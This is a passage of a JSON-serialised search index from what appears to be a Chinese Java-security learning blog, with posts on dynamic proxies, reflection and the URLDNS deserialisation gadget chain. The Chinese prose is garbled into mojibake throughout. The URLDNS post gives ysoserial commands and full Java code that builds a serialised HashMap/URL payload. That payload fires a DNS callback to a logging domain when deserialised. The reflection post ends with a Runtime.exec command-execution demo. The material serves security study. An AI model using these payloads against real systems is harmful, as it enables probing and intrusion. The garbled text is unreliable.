‡ç±»çš„æ‰€æœ‰æ¥å£äº†ï¼Œç»Ÿä¸€ç»§æ‰¿ InvocationHandler ç±»ï¼Œè¿˜è¦é‡å†™ invoke æ–¹æ³• 12345678910public static class HouseProxy implements InvocationHandler&#123; private HouseOwner houseOwner; public HouseProxy(HouseOwner houseOwner)&#123; this.houseOwner = houseOwner; &#125; public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; method.invoke(houseOwner, args); return null; &#125; &#125; å¯ä»¥çœ‹åˆ°åˆ©ç”¨äº†åå°„æŠ€æœ¯ï¼Œéš¾æ€ªå¯ä»¥åœ¨ç±»çš„åˆ›å»ºé˜¶æ®µå¼€å§‹ä»£ç†ï¼Œç„¶ååˆ©ç”¨ Proxy.newProxyInstance åˆ›å»ºä»£ç† 12345RentService proxyInstance = (RentService) Proxy.newProxyInstance( houseOwner.getClass().getClassLoader(), houseOwner.getClass().getInterfaces(), new HouseProxy(houseOwner) ); è°ƒç”¨ä»£ç†æ–¹æ³• 1proxyInstance.rent();// æ–­ç‚¹è°ƒè¯•å‘ç° proxyInstance.rent() å°±ä¼šè¿›å…¥ä»£ç†ç±» HouseProxy çš„ invoke æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥æ‰“å°ä¸€ä¸‹æ–¹æ³•å 1System.out.println(method.getName() + &quot;æ–¹æ³•è¢«è°ƒç”¨&quot;); å¯ä»¥å‘ç°ä»£ç†ç±»çš„å®ç°ç¡®å®æŠ½è±¡å‡ºæ¥äº†ï¼Œåªè¦ç»´æŠ¤ç›®æ ‡ç±»å°±è¡Œäº†ã€‚ 0x05 æ€è€ƒé‚£ä¹ˆåŠ¨æ€ä»£ç†å’Œååºåˆ—åŒ–æ¼æ´åˆèƒ½æ‰¯ä¸Šä»€ä¹ˆå…³ç³»å‘¢ï¼Ÿ æˆ‘ä»¬éƒ½çŸ¥é“ URLDNS åˆ©ç”¨çš„æ˜¯ HashMap è°ƒç”¨äº† hash æ–¹æ³•ç„¶åå°±ä¼šè§¦å‘ä¼ å…¥å¯¹è±¡ key hashçš„ HashCode æ–¹æ³•ï¼Œä»è€Œä¼ å…¥ URL å¯¹è±¡æ¥è§¦å‘ URL çš„ hashCode æ–¹æ³•ã€‚å‡å¦‚ key æ²¡æœ‰è°ƒç”¨ hashCode æ–¹æ³•æ€ä¹ˆåŠå‘¢ï¼Ÿæ¯”å¦‚è°ƒç”¨çš„æ˜¯ key.aaa æ–¹æ³• é‚£æˆ‘ä»¬å°±å¯ä»¥æ‰¾ä¸€ä¸ªåŠ¨æ€ä»£ç†ç±»ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠåŠ¨æ€ä»£ç†ç±»ä¼ ç»™ key ï¼Œä¸è¿‡åŠ¨æ€ä»£ç†ç±»æ‰§è¡Œçš„æ˜¯ä»€ä¹ˆæ–¹æ³•éƒ½ä¼šæ‰§è¡Œ public Object invoke å‡½æ•°ï¼Œå¯èƒ½è¿™ä¸ª invoke å‡½æ•°å®ç°äº† hashCode æ–¹æ³•ï¼Œå¹¶ä¸”è¿™ä¸ªåŠ¨æ€ä»£ç†ç±»ä¹Ÿæ¥å—ä¸€ä¸ªç±»ä½œä¸ºå‚æ•°ï¼Œinvoke è°ƒç”¨äº†æˆ‘ä»¬ä¼ ç»™è¿™ä¸ªåŠ¨æ€ä»£ç†ç±»çš„å‚æ•°ï¼ˆè¿™ä¸ªå‚æ•°å°±æ˜¯æˆ‘ä»¬ä¼ çš„ç±»ï¼‰çš„ hashCode æ–¹æ³•ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥æŠŠ URL ç±»ä¼ ç»™ è¿™ä¸ªåŠ¨æ€ä»£ç†ã€‚","tags":["java å¼€å‘"],"categories":["å¼€å‘"]},{"title":"URLDNS é“¾","path":"/2024/07/29/java/ååºåˆ—åŒ–é“¾/URLDNS/","content":"Java ååºåˆ—åŒ–ç¬¬ä¸€æ¡é“¾ URLDNS 0x01 æ„ä¹‰ URLDNS å°±æ˜¯ysoserialä¸­â¼€ä¸ªåˆ©â½¤é“¾çš„åå­—ï¼Œä½†å‡†ç¡®æ¥è¯´ï¼Œè¿™ä¸ªå…¶å®ä¸èƒ½ç§°ä½œâ€œåˆ©â½¤é“¾â€ã€‚å› ä¸ºå…¶å‚æ•°ä¸ æ˜¯â¼€ä¸ªå¯ä»¥â€œåˆ©â½¤â€çš„å‘½ä»¤ï¼Œâ½½ä»…ä¸ºâ¼€ä¸ªURLï¼Œå…¶èƒ½è§¦å‘çš„ç»“æœä¹Ÿä¸æ˜¯å‘½ä»¤æ‰§â¾ï¼Œâ½½æ˜¯â¼€æ¬¡DNSè¯·æ±‚ã€‚ è™½ç„¶è¿™ä¸ªâ€œåˆ©â½¤é“¾â€å®é™…ä¸Šæ˜¯ä¸èƒ½â€œåˆ©â½¤â€çš„ï¼Œä½†å› ä¸ºå…¶å¦‚ä¸‹çš„ä¼˜ç‚¹ï¼Œâ¾®å¸¸é€‚åˆæˆ‘ä»¬åœ¨æ£€æµ‹ååºåˆ—åŒ–æ¼æ´æ—¶ ä½¿â½¤ï¼š ä½¿â½¤Javaå†…ç½®çš„ç±»æ„é€ ï¼Œå¯¹ç¬¬ä¸‰â½…åº“æ²¡æœ‰ä¾èµ– åœ¨â½¬æ ‡æ²¡æœ‰å›æ˜¾çš„æ—¶å€™ï¼Œèƒ½å¤Ÿé€šè¿‡DNSè¯·æ±‚å¾—çŸ¥æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ æ—¢ç„¶æåˆ°äº† ysoserial é‚£å°±ç®€å•äº†è§£ä¸€ä¸‹å§ï¼Œ2015å¹´Gabriel Lawrence (@gebl)å’ŒChris Frohoff (@frohoff)åœ¨AppSecCaliä¸Šæå‡ºäº†åˆ©â½¤Apache Commons Collectionsæ¥æ„é€ å‘½ä»¤æ‰§â¾çš„åˆ©â½¤ é“¾ï¼Œå¹¶åœ¨å¹´åº•å› ä¸ºå¯¹Weblogicã€JBossã€Jenkinsç­‰è‘—ååº”â½¤çš„åˆ©â½¤â½½ysoserialå°±æ˜¯ä¸¤ä½åŸä½œè€…åœ¨æ­¤è®®é¢˜ä¸­é‡Šå‡ºçš„â¼€ä¸ªâ¼¯å…·ï¼Œå®ƒå¯ä»¥è®©â½¤æˆ·æ ¹æ®â¾ƒâ¼°é€‰æ‹©çš„åˆ©â½¤é“¾ï¼Œâ½£æˆå åºåˆ—åŒ–åˆ©â½¤æ•°æ®ï¼Œé€šè¿‡å°†è¿™äº›æ•°æ®å‘é€ç»™â½¬æ ‡ï¼Œä»â½½æ‰§â¾â½¤æˆ·é¢„å…ˆå®šä¹‰çš„å‘½ä»¤ï¼ˆè½¬è½½è‡ª p ç¥ æœ‰äº† ysoserial ,æˆ‘ä»¬å°±èƒ½å¾ˆæ–¹ä¾¿çš„äº§ç”Ÿæ„é€ é“¾ï¼Œä¸‹é¢æˆ‘ä»¬å°±æ¥æ¢è®¨ URLDNS é“¾çš„å®ç°åŸç†ã€‚ 0x02 è°ƒè¯•æ¥çœ‹çœ‹ ysoserial æ˜¯æ€ä¹ˆå®ç°çš„å§ï¼Œå…ˆå» yakit äº§ç”Ÿä¸€ä¸ªå¯ç”¨åŸŸåï¼Œç„¶åå‘½ä»¤è¡Œç”Ÿæˆ payloadã€‚ 12java -jar ysoserial.jar URLDNS &quot;http://nwmenmnays.dgrh3.cn&quot;java -jar ysoserial.jar URLDNS &quot;http://nwmenmnays.dgrh3.cn&quot; &gt; urldns.bin æ³¨æ„è¿™é‡Œç”Ÿæˆ urldns.bin æ–‡ä»¶å¾—åœ¨ kali ä¸‹å®Œæˆï¼Œwindows ä¸‹çš„è¯åé¢ååºåˆ—åŒ–è°ƒè¯•ä¼šæŠ¥é”™ã€‚ å¾—åˆ°åç¼–å†™æµ‹è¯•ä»£ç  1234567891011public class URLDNSTest &#123; public static void main(String[] args) throws IOException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;E:\\\\tools\\\\ysoserial\\\\URLDNS.ser&quot;)); try &#123; Object o = ois.readObject(); System.out.println(o); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; æ‰§è¡Œä»£ç å¯ä»¥å‘ç° yakit å·²ç»æ”¶åˆ°äº† dns æŸ¥è¯¢ï¼Œä¸‹é¢åŠ¨æ€è°ƒè¯•çœ‹ä¸€ä¸‹æ‰§è¡Œæµç¨‹ã€‚ æˆ‘ä»¬å¯ä»¥çœ‹åˆ° ysoserial æºç å·²ç»ç»™å‡ºäº†åˆ©ç”¨é“¾ 12345* Gadget Chain:* HashMap.readObject()* HashMap.putVal()* HashMap.hash()* URL.hashCode() æˆ‘ä»¬åœ¨è¿™å‡ å¤„å…³é”®ä»£ç å¤„æ‰“ä¸‹æ–­ç‚¹ï¼Œä¸èƒ½ä¸€ä¸‹å…¨æ‰“ï¼Œå› ä¸º hash() è¿™ä¸ªå‡½æ•°è°ƒç”¨çš„å¤ªé¢‘ç¹äº†ï¼Œå¹²æ‰°å¤ªå¤šã€‚æ‰“ä¸€ä¸ªæ‰§è¡Œä¸€ä¸‹ï¼Œå…ˆæŠŠ HashMap.putVal æ–­ç‚¹æ‰“ä¸Šã€‚ 1putVal(hash(key), key, value, false, false); å¯ä»¥çœ‹åˆ° key å€¼å°±æ˜¯æˆ‘ä»¬çš„ url å‚æ•° ç„¶åè¿›å…¥ hash å‡½æ•° 1234static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125; è¿™é‡Œä¸è¦ç›´æ¥è¿› **hashCode()**ï¼Œä¼šè¿›åˆ° Object é‡Œçš„ã€‚ç›´æ¥ f7 æ­¥è¿›ï¼Œæ¥åˆ° URL ç±»çš„ hashcode å‡½æ•°ä¸‹ 1234567public synchronized int hashCode() &#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode;&#125; hashcode å€¼ä¸º -1 è¿›å…¥ handler.hashCode å‡½æ•°ï¼Œæ³¨æ„åˆ° 359 è¡Œ 1InetAddress addr = getHostAddress(u); å†æ¬¡è·Ÿè¿› getHostAddress æ–¹æ³• 123456789101112131415161718protected synchronized InetAddress getHostAddress(URL u) &#123; if (u.hostAddress != null) return u.hostAddress; String host = u.getHost(); if (host == null || host.equals(&quot;&quot;)) &#123; return null; &#125; else &#123; try &#123; u.hostAddress = InetAddress.getByName(host); &#125; catch (UnknownHostException ex) &#123; return null; &#125; catch (SecurityException se) &#123; return null; &#125; &#125; return u.hostAddress;&#125; è¿™é‡Œ InetAddress.getByName(host) çš„ä½œç”¨æ˜¯æ ¹æ®ä¸»æœºåï¼Œè·å–å…¶IPåœ°å€ï¼Œåœ¨ç½‘ç»œä¸Šå…¶å®å°±æ˜¯â¼€æ¬¡ DNSæŸ¥è¯¢ã€‚åˆ°è¿™é‡Œå°±ä¸å¿…è¦å†è·Ÿäº†ï¼Œyakit ä¹Ÿæ”¶åˆ° dns æŸ¥è¯¢äº†ã€‚ 0x03 é‡å†™ç°åœ¨æˆ‘ä»¬è‡ªå·±æ¥å®ç°ï¼Œå…ˆæ¢³ç†ä¸€ä¸‹ååºåˆ—åŒ–æµç¨‹ 123456HashMap-&gt;readObject()HashMap-&gt;hash()URL-&gt;hashCode()URLStreamHandler-&gt;hashCode()URLStreamHandler-&gt;getHostAddress()InetAddress-&gt;getByName() å…ˆæŠŠ HashMap å’Œ url å¯¹è±¡åˆ›å»ºå‡ºæ¥ 123HashMap ht = new HashMap();String url = &quot;http://wqyrtnekro.dgrh3.cn&quot;;URL u = new URL(url); çœ‹ yso æºç  1ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. æˆ‘ä»¬ä¹Ÿæ¨¡ä»¿ç€å†™ï¼Œput é”®å€¼å¯¹ 1ht.put(u, url); ç„¶ååºåˆ—åŒ– 123456789101112131415161718import java.io.*;import java.lang.reflect.Field;import java.net.URL;import java.util.HashMap;public class URLDNS &#123; public static void serialize(Object obj) throws IOException &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;urldns.bin&quot;)); oos.writeObject(obj); &#125; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException &#123; HashMap ht = new HashMap(); String url = &quot;http://wqyrtnekro.dgrh3.cn&quot;; URL u = new URL(url); ht.put(u, url); serialize(ht); &#125;&#125; åºåˆ—åŒ–å‘ç°ç›´æ¥å‘å‡º dns æŸ¥è¯¢äº†ï¼Œo.O? åŠ¨æ€çœ‹çœ‹ä»€ä¹ˆæƒ…å†µã€‚ åŸæ¥æ˜¯ ht.put è§¦å‘äº† hash ï¼Œåˆèµ°äº†ä¸€é putVal åˆ° getHostAddress çš„æµç¨‹ 123public V put(K key, V value) &#123; return putVal(hash(key), key, value, false, true);&#125; è¿™æ ·æˆ‘ä»¬å¯ä»¥åœ¨ ht.put(u, url); ä¹‹å‰åˆ©ç”¨åå°„æ¥ä½¿ URL ç±»çš„ç§æœ‰å˜é‡ hashcode å€¼ä¸ä¸º -1ï¼ˆé»˜è®¤åˆå§‹å€¼ä¸º -1ï¼‰ï¼Œè¿™æ ·å°±ä¸ä¼šè¿›å…¥ handler.hashCode äº†ã€‚ 1234Class clazz = u.getClass();Field field = clazz.getDeclaredField(&quot;hashCode&quot;);field.setAccessible(true);field.set(u, 1); å†åºåˆ—åŒ–å°±ä¸ä¼šè§¦å‘äº†ï¼Œä½†æ˜¯ååºåˆ—è¯ä¹Ÿä¸ä¼šè§¦å‘ï¼ŒO.o? ååºåˆ—åŒ–åŠ¨è°ƒçœ‹çœ‹ï¼ŒåŸæ¥æ˜¯æˆ‘ä»¬ä¹‹å‰è®¾ç½® hashCode å˜é‡ä¸º 1 ç„¶åç›´æ¥èµ° 12if (hashCode != -1)return hashCode; æ‰€ä»¥è¿™é‡Œ hashCode ä»ç„¶èµ°çš„æ˜¯è¿™ä¸ªé€»è¾‘ï¼Œé‚£æˆ‘ä»¬æƒ³è®©ä»–è¿›å…¥ 1hashCode = handler.hashCode(this); å°±åªèƒ½å†åˆ©ç”¨åå°„åœ¨ ht.put(u, url) ä¹‹åé‡æ–°è®¾ç½® hashCode ä¸º -1 123field.set(u, 1);ht.put(u, url);field.set(u, -1); æˆåŠŸåªåœ¨ååºåˆ—åŒ–é˜¶æ®µè§¦å‘ dns æŸ¥è¯¢ å®Œæ•´ä»£ç  1234567891011121314151617181920212223import java.io.*;import java.lang.reflect.Field;import java.net.URL;import java.util.HashMap;public class URLDNS &#123; public static void serialize(Object obj) throws IOException &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;urldns.bin&quot;)); oos.writeObject(obj); &#125; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException &#123; HashMap ht = new HashMap(); String url = &quot;http://wqyrtnekro.dgrh3.cn&quot;; URL u = new URL(url); Class clazz = u.getClass(); Field field = clazz.getDeclaredField(&quot;hashCode&quot;); field.setAccessible(true); field.set(u, 1); ht.put(u, url); field.set(u, -1); serialize(ht); &#125;&#125; 0x04 æ€è€ƒå¤ç°å®Œä¸ç¦ä¼šæƒ³ï¼Œå‘ç°è¿™æ¡é“¾çš„å¤§ä½¬æ˜¯æ€ä¹ˆæƒ³åˆ°è¿™æ¡é“¾çš„ï¼Ÿ åˆ©ç”¨ HashMap ç±»ä½œä¸ºæ¥å£æ˜¯å› ä¸ºå…¶å®ç°äº†Serializableæ¥å£ï¼Œé‡å†™äº†readObject,é‡å†™çš„ readObject è°ƒç”¨ hash å‡½æ•°è®¡ç®— key çš„hashCodeï¼Œè€Œjava.net.URLçš„hashCodeåœ¨è®¡ç®—æ—¶ä¼šè°ƒç”¨ getHostAddress æ¥è§£æåŸŸå, ä»è€Œå‘å‡º DNS è¯·æ±‚ã€‚ å¯ä»¥çœ‹åˆ°ä» HashMap åˆ° URL å…³é”®åœ¨äº hashCode æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ç‚¹å‡»çš„è¯è·³è½¬çš„æ˜¯ Object ç±»ï¼Œä¹Ÿå°±æ˜¯è¯´å¾ˆå¤šç±»éƒ½ä¼šæœ‰ hashCodeæ–¹æ³•ï¼Œä¸ºä»€ä¹ˆååæŒ‘é€‰ HashMap å‘¢ï¼Ÿæˆ‘è§‰å¾— HashMap è°ƒç”¨äº† hashcode æ–¹æ³•å€’æ˜¯å…¶æ¬¡ï¼Œæœ€ä¸»è¦çš„æ˜¯å®ƒæ¥å—çš„å‚æ•°ç±»å‹æ²¡æœ‰é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰èƒ½ä¼  key ä¸º URL ï¼Œè¿›è€Œæ¥åˆ° URL çš„ hashCode æ–¹æ³•é‡Œæ¥è§¦å‘ DNS æŸ¥è¯¢ã€‚","tags":["java å®‰å…¨"],"categories":["java å®‰å…¨","ååºåˆ—åŒ–"]},{"title":"åå°„","path":"/2024/07/28/java/å¼€å‘/åå°„/","content":"å¼€å¯ java å®‰å…¨å­¦ä¹ ç¬¬ä¸‰ç«™ï¼Œjava åå°„ 0x01 åå°„çš„æ„ä¹‰å­˜åœ¨å³åˆç†ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆè¦æœ‰åå°„å‘¢ï¼Ÿåå°„èƒ½å¤Ÿä½¿å¾—ç¨‹åºåœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°æ“ä½œç±»å’Œå¯¹è±¡ï¼ŒåŒ…æ‹¬åˆ›å»ºå¯¹è±¡ï¼Œè®¿é—®å­—æ®µï¼Œè°ƒç”¨æ–¹æ³•ç­‰ç­‰ã€‚è¿™æ ·è¯´å¯èƒ½ç¨è®¸æŠ½è±¡ï¼Œæˆ‘ä»¬å…ˆåè¿‡æ¥ç†è§£ï¼Œæ­£å°„æ˜¯ä¸æ˜¯å°±æ˜¯é™æ€åœ°æ“ä½œç±»å’Œå¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯è¯´æ­£å¸¸æƒ…å†µä¸‹æˆ‘ä»¬çŸ¥é“ä¸€ä¸ªç±»çš„æ ·å­ï¼Œç›´æ¥å®ä¾‹åŒ–å³å¯ã€‚ 12Apple apple = new Apple(); //ç›´æ¥åˆå§‹åŒ–ï¼Œã€Œæ­£å°„ã€apple.setPrice(4); è¿™ç§ç›´æ¥è®¿é—®çš„æ–¹å¼æ¸…æ™°ä¸”ç›´è§‚ï¼Œä½†åœ¨æœ‰äº›åœºæ™¯ä¸­éœ€è¦åŠ¨æ€è°ƒç”¨è°ƒç”¨æ“ä½œè¿™äº›æˆå‘˜ï¼Œæ¯”å¦‚åœ¨ç¨‹åºè¿è¡Œæ—¶ï¼Œæ ¹æ®æ•°æ®åº“æä¾›çš„ç±»åæˆ–è€…æ–¹æ³•åï¼Œæˆ–è€…åŸºäºå­—ç¬¦ä¸²æ¥åŠ¨æ€å®ä¾‹åŒ–å¯¹è±¡è°ƒç”¨æ–¹æ³•æ—¶å°±ä¸é€‚ç”¨äº†ï¼Œå°±å¾—ç”¨åˆ° java çš„åå°„æœºåˆ¶ã€‚spring&#x2F;spring boot æˆ–è€… mybatis å°±åº”ç”¨äº†å¤§é‡åå°„æœºåˆ¶ï¼Œæ³¨è§£ä»¥åŠåŠ¨æ€ä»£ç†ä¹Ÿè¿ç”¨åˆ°äº†åå°„æœºåˆ¶ã€‚ 0x02 åå°„åŸç†åå°„çš„å®ç°åŸç†å…¶å…³é”®åœ¨ä¸€ä¸ªç‰¹æ®Šçš„å¯¹è±¡ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºç±»å¯¹è±¡ï¼Œå³ Class å¯¹è±¡ã€‚Class å¯¹è±¡æ˜¯ç”± Java è™šæ‹Ÿæœº JVM åœ¨åŠ è½½ç±»æ—¶è‡ªåŠ¨åˆ›å»ºçš„ï¼Œç”¨äºå­˜å‚¨ç±»çš„ä¿¡æ¯ï¼Œé€šè¿‡å®ƒå°±èƒ½è®¿é—®ç±»çš„ç»“æ„ï¼Œä»¥åŠå¯¹ç±»æœ¬èº«ä»¥åŠå®ƒçš„å®ä¾‹è¿›è¡Œæ“ä½œã€‚ JVM åˆ›å»º Class çš„è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼Œå½“æˆ‘ä»¬ç¼–å†™ä¸€ä¸ª .java ç±»å¹¶å®Œæˆç¼–è¯‘åï¼Œç¼–è¯‘å™¨å°†å…¶è½¬åŒ–ä¸ºå­—èŠ‚ç å¹¶å­˜å‚¨åœ¨ .class æ–‡ä»¶ä¸­ã€‚æ¥ä¸‹æ¥åœ¨ç±»çš„åŠ è½½ä¸­ï¼Œè™šæ‹Ÿæœºåˆ©ç”¨ Class Loader è¯»å– class æ–‡ä»¶ï¼Œå°†å…¶ä¸­çš„å­—èŠ‚ç åŠ è½½åˆ°å†…å­˜ä¸­å¹¶åˆ©ç”¨å…¶æºå¸¦çš„ä¿¡æ¯æ¥åˆ›å»ºç›¸åº”çš„ Class å¯¹è±¡ã€‚æˆ‘ä»¬çŸ¥é“æ¯ä¸ªç±»åœ¨ JVM ä¸­åªåŠ è½½ä¸€æ¬¡ï¼Œæ‰€ä»¥æ¯ä¸ªç±»éƒ½å¯¹åº”å”¯ä¸€çš„ Class å¯¹è±¡ã€‚ æœ‰ä¸€å—é•œå­æˆ‘ä»¬å°±èƒ½åå°„å…‰çº¿ã€‚é‚£ä¹ˆåœ¨æˆ‘çœ‹æ¥ java çš„åå°„ä¸­é•œå­å°±æ˜¯ Class å¯¹è±¡ã€‚ 0x03 åå°„å®ç°è·å– Class å¯¹è±¡ ä½¿ç”¨ç±»å­—é¢å¸¸é‡ï¼Œå°±æ˜¯ç±»çš„åç§° + .class è¿™æ˜¯æœ€ç›´æ¥çš„æ–¹å¼ï¼Œå› ä¸ºåœ¨ç¼–è¯‘æ—¶å°±ç¡®å®šäº†å…·ä½“çš„ç±»ï¼Œä»ç„¶å±äºé™æ€å¼•ç”¨ 1Class&lt;User&gt; userClass = User.class; å› ä¸ºåœ¨ç¼–è¯‘æ—¶å°±ç¡®å®šäº†ï¼Œå·²ç»æ˜ç¡®äº†æ˜¯ä¸ª User ç±» çš„ Class ï¼Œæ‰€ä»¥æ³›å‹ç›´æ¥ç»™ Userã€‚ ä½¿ç”¨å¯¹è±¡çš„ getClass æ–¹æ³•ï¼Œå¦‚æœä½ å·²çŸ¥ä¸€ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆå¯ä»¥è°ƒç”¨å®ƒçš„ getClass æ–¹æ³•æ¥è·å–å®ƒçš„ Class å¯¹è±¡ã€‚ 12User user = new User(&quot;she11F&quot;,18);Class&lt;?&gt; clazz = user.getClass(); è¿™é‡Œæ³›å‹ç”¨é€šé…ç¬¦æ˜¯å› ä¸ºè¿™ä¸ª Class å¯¹è±¡æ˜¯åœ¨ç¨‹åºè¿è¡Œæ—¶ä» user å®ä¾‹è·å–çš„ï¼Œ user å®ä¾‹çš„å…·ä½“ç±»å‹åªèƒ½åœ¨ç¨‹åºè¿è¡Œæ—¶æ‰ç¡®å®šï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ç¼–è¯‘é˜¶æ®µæ— æ³•ç¡®å®š Class å¯¹è±¡çš„å…·ä½“ç±»å‹ï¼Œæ‰€ä»¥æ³›å‹æ˜¯é€šé…ç¬¦ã€‚ Class ç±»çš„ forName é™æ€æ–¹æ³• è¿™ç§æ–¹æ³•ç”¨äºç¨‹åºè¿è¡Œæ—¶åŠ¨æ€åŠ è½½æŒ‡å®šçš„ç±»ï¼Œå¹¶è¿”å›è¯¥ç±»çš„ Class å¯¹è±¡å®ä¾‹ã€‚åŒå¸¸ç”¨äºç±»ååœ¨ç¼–è¯‘æ—¶ä¸å¯çŸ¥çš„åœºæ™¯ä¸­ 1Class&lt;?&gt; clazz = Class.forName(&quot;User&quot;); è¿™ç§æ–¹æ³•ä¼šè§¦å‘ç±»çš„åˆå§‹åŒ–ï¼Œé™æ€å—ä¼šè¢«æ‰§è¡Œã€‚ è·å–ç±»çš„å­—æ®µ getDeclaredFields() è¿”å›ç±»å‹æ˜¯ Field ç±»å‹çš„æ•°ç»„ 1234Field[] fields = clazz.getDeclaredFields(); for (Field field : fields) &#123; System.out.println(field.getName()); &#125; getFields(); åªè·å– public å­—æ®µï¼ˆå¦‚æœæœ‰çˆ¶ç±»çš„è¯ä¹Ÿå¯ä»¥è·å¾—çˆ¶ç±»çš„æ‰€æœ‰ public å­—æ®µ 1Field[] fields = clazz.getFields(); â€‹\tç»§æ‰¿ Person ç±»å â€‹\tå¦‚æœæƒ³è·å¾—çˆ¶ç±»æ‰€æœ‰å­—æ®µæ€ä¹ˆåŠï¼Ÿå¯ä»¥å…ˆè·å–çˆ¶ç±»çš„ Class å¯¹è±¡ï¼Œå†è·å–å…¶ getDeclaredFields() 1Field[] fields = clazz.getSuperclass().getDeclaredFields(); getDeclaredField() è·å–æŒ‡å®šå­—æ®µ 1Field field = clazz.getDeclaredField(&quot;name&quot;); è¦è·å–å­—æ®µå€¼çš„è¯å¯ä»¥ç”¨ get æ–¹æ³•ï¼Œä¼ é€’çš„å‚æ•°æ˜¯ç±»çš„å®ä¾‹åŒ–å¯¹è±¡ 123Field field = clazz.getDeclaredField(&quot;name&quot;);User user = new User(&quot;she11F&quot;, 18);System.out.println(field.get(user)); å¦‚æœæ˜¯æƒ³è·å¾—é™æ€å˜é‡çš„è¯ä¼  null å³å¯ 12Field field = clazz.getDeclaredField(&quot;sex&quot;);System.out.println(field.get(null)); è®¿é—®ç§æœ‰å˜é‡çš„è¯è¦è®¾ç½®è®¿é—®æƒé™ä¸ºå¯è¾¾ 123Field field = clazz.getDeclaredField(&quot;email&quot;);field.setAccessible(true);System.out.println(field.get(null)); å½“ç„¶å‡ºäº†è·å–å€¼ä¹Ÿå¯ä»¥è®¾ç½®å€¼ï¼Œget æ¢æˆ set å³å¯ è°ƒç”¨æ–¹æ³•getDeclaredMethods åŒç†ï¼Œè¿™æ ·å°±èƒ½è·å–æ‰€æœ‰æ–¹æ³•å 1234Method[] methods = clazz.getDeclaredMethods(); for(Method method : methods)&#123; System.out.println(method.getName()); &#125; æ¥çœ‹ä¸€ä¸‹ä¸€èˆ¬æ–¹æ³•æ€ä¹ˆé€šè¿‡åå°„è°ƒç”¨å§ã€‚ 1234Class&lt;?&gt; clazz = Class.forName(&quot;User&quot;);User user = new User();Method method = clazz.getMethod(&quot;getName&quot;);System.out.println(method.invoke(user)); è·å–æ–¹æ³•åç”¨ invoke() å³å¯æ‰§è¡Œæ–¹æ³•ï¼Œé™æ€æ–¹æ³•æˆ–è€…ç§æœ‰æ–¹æ³•çš„è¯å’Œè·å–å­—æ®µå€¼ä¸€æ ·çš„è§„åˆ™ invoke çš„ä½œç”¨æ˜¯æ‰§è¡Œæ–¹æ³•ï¼Œå®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ï¼š å¦‚æœè¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªæ™®é€šæ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»å¯¹è±¡ å¦‚æœè¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±» è¿™ä¹Ÿæ¯”è¾ƒå¥½ç†è§£äº†ï¼Œæˆ‘ä»¬æ­£å¸¸æ‰§è¡Œæ–¹æ³•æ˜¯ [1].method([2], [3], [4]â€¦) ï¼Œå…¶å®åœ¨åå°„é‡Œå°±æ˜¯ method.invoke([1], [2], [3], [4]â€¦) ã€‚ 1234// é™æ€System.out.println(method.invoke(null));// ç§æœ‰method.setAccessible(true); é‚£ä¹ˆå¦‚ä½•ä¼ å‚å‘¢ï¼Ÿ è·å–æ–¹æ³•æ—¶ï¼Œç¬¬äºŒä¸ªå‚æ•°è®¾ç½®ä¸ºå¾…è°ƒç”¨å‡½æ•°çš„å‚æ•°çš„ Class å¯¹è±¡ 1Method method = clazz.getMethod(&quot;getName&quot;,String.class); è°ƒç”¨ invoke æ—¶ï¼Œå³å¯ä¼ é€’å‚æ•° 12Method method = clazz.getMethod(&quot;getName&quot;,String.class);System.out.println(method.invoke(null,&quot;makka_pakka&quot;)); 0x04 åå°„åˆ›å»ºç±»çš„å®ä¾‹åœ¨åå°„ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸è·å–ç±»çš„æ„é€ å™¨æ¥åˆ›å»ºå®ä¾‹ã€‚ 1Constructor constructor = clazz.getDeclaredConstructor(String.class, int.class); å®ä¾‹åŒ– 1Object obj = constructor.newInstance(&quot;she11F&quot;, 18); è·å¾—å˜é‡å’Œè°ƒç”¨å®ä¾‹æ–¹æ³•å…¶å®å’Œä¹‹å‰æ˜¯ä¸€æ ·çš„ï¼Œå”¯ä¸€åŒºåˆ«å°±æ˜¯å¯¹è±¡éƒ½æ¢æˆäº† newInstance å®ä¾‹åŒ–å‡ºçš„å¯¹è±¡ã€‚ 1234567Class&lt;?&gt; clazz = Class.forName(&quot;User&quot;);Constructor constructor = clazz.getConstructor(String.class, int.class);Object obj = constructor.newInstance(&quot;she11F&quot;, 18);Field field = clazz.getDeclaredField(&quot;name&quot;);System.out.println(field.get(obj));Method method = clazz.getMethod(&quot;getName&quot;,String.class);System.out.println(method.invoke(obj,&quot;makka_pakka&quot;)); æˆ‘ä»¬å¯ä»¥è¯•ç€ç”¨åå°„æ¥æ„é€ å‘½ä»¤æ‰§è¡Œ 12Runtime runtime = Runtime.getRuntime();runtime.exec(&quot;calc&quot;); 